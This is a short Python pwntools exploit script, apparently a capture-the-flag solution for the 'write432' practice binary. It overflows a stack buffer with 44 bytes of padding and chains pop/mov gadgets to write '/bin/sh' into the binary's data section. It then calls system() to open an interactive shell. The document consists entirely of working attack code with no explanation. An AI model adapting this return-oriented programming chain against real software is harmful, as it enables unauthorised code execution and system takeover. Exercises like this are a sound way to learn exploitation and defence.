from pwn import *
context.log_level = 'debug'
e = ELF("./write432")
system = p32(e.symbols["system"])
pop_edi_ebp = p32(0x080486da)
mov_edi_ebp = p32(0x08048670)
data = p32(0x804a028)
data1 = p32(0x804a028+4)

payload = "a"*44
payload += pop_edi_ebp+data+"/bin"
payload += mov_edi_ebp
payload += pop_edi_ebp+data1+"/sh\x00"
payload += mov_edi_ebp
payload += system
payload += p32(0xdeadbeaf)
payload += data



p = process("./write432")
print p.recv()
p.sendline(payload)

p.interactive()


